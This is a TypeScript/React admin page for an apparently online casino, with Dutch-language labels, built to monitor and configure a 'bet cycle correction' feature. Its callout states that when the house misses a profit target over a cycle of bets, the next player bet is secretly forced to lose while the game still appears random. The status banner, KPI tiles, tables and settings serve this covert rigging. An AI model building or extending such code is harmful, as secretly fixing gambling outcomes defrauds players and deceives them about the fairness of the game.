import { redirect } from 'next/navigation';
import { getCurrentUser } from '@/lib/auth';
import { getCycleStats } from '@/lib/cycleEngine';
import AdminNav from '@/components/layout/AdminNav';
import CycleSettings from './CycleSettings';

const eur = (n: number) => `€${n.toFixed(2)}`;

export default async function AdminCyclePage() {
  const user = await getCurrentUser();
  if (!user) redirect('/login');
  if (user.role !== 'ADMIN') redirect('/dashboard');

  const stats = await getCycleStats();
  const { config, currentCycleBets } = stats;

  const th: React.CSSProperties = {
    padding: '9px 14px', borderBottom: '1px solid var(--border-color)',
    fontWeight: 600, color: 'var(--text-muted)', textAlign: 'left',
    fontSize: 11, textTransform: 'uppercase', letterSpacing: '0.05em', whiteSpace: 'nowrap',
  };
  const td = (extra?: React.CSSProperties): React.CSSProperties => ({
    padding: '8px 14px', fontSize: 13,
    borderBottom: '1px solid var(--border-color)', ...extra,
  });

  return (
    <div style={{ maxWidth: 1000, margin: '0 auto', padding: '24px 16px 48px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 800, color: 'var(--text-primary)' }}>Admin</h1>
      <p style={{ fontSize: 13, color: 'var(--text-secondary)', marginTop: 4, marginBottom: 18 }}>
        Bet-cyclus — gegarandeerde winstflow
      </p>
      <AdminNav active="/admin/cycle" />

      {/* How it works callout */}
      <div style={{ padding: '12px 16px', borderRadius: 'var(--radius-md)', background: 'var(--bg-secondary)', border: '1px solid var(--border-color)', marginBottom: 20, fontSize: 13, color: 'var(--text-secondary)', lineHeight: 1.7 }}>
        <strong style={{ color: 'var(--text-primary)' }}>Hoe het werkt:</strong> Bets zijn volledig random zoals normaal. Na elke <strong style={{ color: 'var(--text-primary)' }}>{config.cycleSize} bets</strong> controleren we of het huis minstens <strong style={{ color: 'var(--accent-green)' }}>€{config.targetProfitPerCycle}</strong> heeft gewonnen in die cyclus. Zo niet, dan wordt de <em>volgende bet</em> stiekem een zekere verliesbet voor de speler — de enige correctie die nodig is. Alles voelt random voor de speler.
      </div>

      {/* Status banner */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 20, padding: '12px 16px', borderRadius: 'var(--radius-md)', background: config.enabled ? 'rgba(0,231,1,0.06)' : 'rgba(237,66,69,0.08)', border: `1px solid ${config.enabled ? 'rgba(0,231,1,0.2)' : 'rgba(237,66,69,0.2)'}` }}>
        <span style={{ width: 9, height: 9, borderRadius: '50%', background: config.enabled ? 'var(--accent-green)' : 'var(--accent-red)', flexShrink: 0, animation: config.enabled ? 'pulse 1.5s ease-in-out infinite' : 'none' }} />
        <span style={{ fontSize: 13, fontWeight: 700, color: config.enabled ? 'var(--accent-green)' : 'var(--accent-red)' }}>
          Cyclus-correctie {config.enabled ? 'ACTIEF' : 'UITGESCHAKELD'}
        </span>
        {stats.correctionPending && (
          <span style={{ marginLeft: 8, fontSize: 12, fontWeight: 700, color: 'var(--accent-yellow)', padding: '2px 10px', borderRadius: 999, background: 'rgba(255,193,7,0.12)', border: '1px solid rgba(255,193,7,0.3)' }}>
            ⚡ Correctiebet gepland voor volgende inzet
          </span>
        )}
      </div>

      {/* KPI tiles */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(155px, 1fr))', gap: 10, marginBottom: 22 }}>
        <Kpi label="Huidige cyclus" value={`#${stats.currentCycleNumber}`} />
        <Kpi label="Positie" value={`${stats.positionInCycle} / ${config.cycleSize}`} />
        <Kpi label="Voltooide cycli" value={String(stats.cyclesCompleted)} />
        <Kpi label="Huis winst (werkelijk)" value={eur(stats.totalProfit)} accent={stats.totalProfit >= 0 ? 'var(--accent-green)' : 'var(--accent-red)'} />
        <Kpi label="Cyclus winst nu" value={eur(stats.currentCycleProfit)} accent={stats.currentCycleProfit >= config.targetProfitPerCycle ? 'var(--accent-green)' : 'var(--accent-yellow)'} />
        <Kpi label="Doel per cyclus" value={eur(config.targetProfitPerCycle)} />
        <Kpi label="Totaal ingezet" value={eur(stats.wagered)} />
        <Kpi label="Totaal uitbetaald" value={eur(stats.paid)} />
      </div>

      {/* Current cycle bet list */}
      <h2 style={{ fontSize: 15, fontWeight: 700, color: 'var(--text-primary)', marginBottom: 10 }}>
        Cyclus #{stats.currentCycleNumber} — huidige bets ({currentCycleBets.length}/{config.cycleSize})
      </h2>

      {/* Progress bar */}
      <div style={{ height: 6, borderRadius: 999, background: 'var(--bg-tertiary)', marginBottom: 14, overflow: 'hidden' }}>
        <div style={{ height: '100%', width: `${(currentCycleBets.length / config.cycleSize) * 100}%`, background: stats.currentCycleProfit >= config.targetProfitPerCycle ? 'var(--accent-green)' : 'var(--accent-yellow)', borderRadius: 999, transition: 'width 0.3s' }} />
      </div>

      {currentCycleBets.length === 0 ? (
        <p style={{ fontSize: 13, color: 'var(--text-secondary)', marginBottom: 20 }}>Nog geen bets in deze cyclus.</p>
      ) : (
        <div className="card" style={{ padding: 0, overflowX: 'auto', marginBottom: 20 }}>
          <table style={{ width: '100%', borderCollapse: 'collapse' }}>
            <thead>
              <tr>
                <th style={th}>#</th>
                <th style={th}>Game</th>
                <th style={th}>Inzet</th>
                <th style={th}>Uitkomst</th>
                <th style={th}>Payout</th>
                <th style={th}>Huis winst</th>
                <th style={th}>Cumulatief</th>
              </tr>
            </thead>
            <tbody>
              {currentCycleBets.map((b, i) => {
                const cumProfit = currentCycleBets.slice(0, i + 1).reduce((s, x) => s + x.profit, 0);
                return (
                  <tr key={b.id}>
                    <td style={td({ color: 'var(--text-muted)' })}>{b.betInCycle}</td>
                    <td style={td({ color: 'var(--text-secondary)' })}>{b.game}</td>
                    <td style={td()}>{eur(b.betAmount)}</td>
                    <td style={td({ fontWeight: 700, color: b.outcome === 'WIN' ? 'var(--accent-red)' : 'var(--accent-green)' })}>
                      {b.outcome === 'WIN' ? '↑ Speler wint' : '↓ Speler verliest'}
                    </td>
                    <td style={td()}>{eur(b.payout)}</td>
                    <td style={td({ fontWeight: 700, color: b.profit >= 0 ? 'var(--accent-green)' : 'var(--accent-red)' })}>
                      {b.profit >= 0 ? '+' : ''}{eur(b.profit)}
                    </td>
                    <td style={td({ fontWeight: 700, color: cumProfit >= 0 ? 'var(--accent-green)' : 'var(--accent-red)' })}>
                      {cumProfit >= 0 ? '+' : ''}{eur(cumProfit)}
                    </td>
                  </tr>
                );
              })}
            </tbody>
            <tfoot>
              <tr style={{ background: 'var(--bg-secondary)' }}>
                <td colSpan={5} style={{ ...td({ fontWeight: 700, color: 'var(--text-primary)' }), borderTop: '2px solid var(--border-color)' }}>Cyclus totaal</td>
                <td colSpan={2} style={{ ...td({ fontWeight: 800, fontSize: 15, color: stats.currentCycleProfit >= config.targetProfitPerCycle ? 'var(--accent-green)' : 'var(--accent-yellow)' }), borderTop: '2px solid var(--border-color)' }}>
                  {stats.currentCycleProfit >= 0 ? '+' : ''}{eur(stats.currentCycleProfit)}
                  {stats.currentCycleProfit >= config.targetProfitPerCycle
                    ? <span style={{ marginLeft: 8, fontSize: 11, color: 'var(--accent-green)' }}>✓ Doel gehaald</span>
                    : <span style={{ marginLeft: 8, fontSize: 11, color: 'var(--accent-yellow)' }}>Doel: {eur(config.targetProfitPerCycle)} ({eur(config.targetProfitPerCycle - stats.currentCycleProfit)} te gaan)</span>
                  }
                </td>
              </tr>
            </tfoot>
          </table>
        </div>
      )}

      {/* Cycle history */}
      {stats.cycleHistory.length > 0 && (
        <>
          <h2 style={{ fontSize: 15, fontWeight: 700, color: 'var(--text-primary)', marginBottom: 10 }}>Cyclus-geschiedenis</h2>
          <div className="card" style={{ padding: 0, overflowX: 'auto', marginBottom: 22 }}>
            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
              <thead>
                <tr>
                  <th style={th}>Cyclus</th>
                  <th style={th}>Bets</th>
                  <th style={th}>Ingezet</th>
                  <th style={th}>Uitbetaald</th>
                  <th style={th}>Huis winst</th>
                  <th style={th}>Doel</th>
                  <th style={th}>Status</th>
                </tr>
              </thead>
              <tbody>
                {stats.cycleHistory.map((c) => (
                  <tr key={c.cycleNumber}>
                    <td style={td({ fontWeight: 700 })}>#{c.cycleNumber}</td>
                    <td style={td({ color: 'var(--text-secondary)' })}>{c.bets}</td>
                    <td style={td()}>{eur(c.wagered)}</td>
                    <td style={td()}>{eur(c.paid)}</td>
                    <td style={td({ fontWeight: 700, color: c.profit >= 0 ? 'var(--accent-green)' : 'var(--accent-red)' })}>
                      {c.profit >= 0 ? '+' : ''}{eur(c.profit)}
                    </td>
                    <td style={td({ color: 'var(--text-muted)' })}>{c.complete ? eur(config.targetProfitPerCycle) : '—'}</td>
                    <td style={td()}>
                      {!c.complete ? (
                        <span style={{ color: 'var(--accent-yellow)', fontSize: 12, fontWeight: 600 }}>Lopend</span>
                      ) : c.profit >= config.targetProfitPerCycle ? (
                        <span style={{ color: 'var(--accent-green)', fontSize: 12, fontWeight: 600 }}>✓ Doel gehaald</span>
                      ) : (
                        <span style={{ color: 'var(--accent-red)', fontSize: 12, fontWeight: 600 }}>✗ Onder doel</span>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </>
      )}

      {/* Settings */}
      <h2 style={{ fontSize: 15, fontWeight: 700, color: 'var(--text-primary)', marginBottom: 10 }}>Cyclus-instellingen</h2>
      <CycleSettings initialConfig={config} />
    </div>
  );
}

function Kpi({ label, value, accent }: { label: string; value: string; accent?: string }) {
  return (
    <div className="card" style={{ padding: 14 }}>
      <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--text-secondary)', textTransform: 'uppercase', letterSpacing: '0.06em' }}>{label}</div>
      <div style={{ fontSize: 20, fontWeight: 800, color: accent || 'var(--text-primary)', marginTop: 5 }}>{value}</div>
    </div>
  );
}
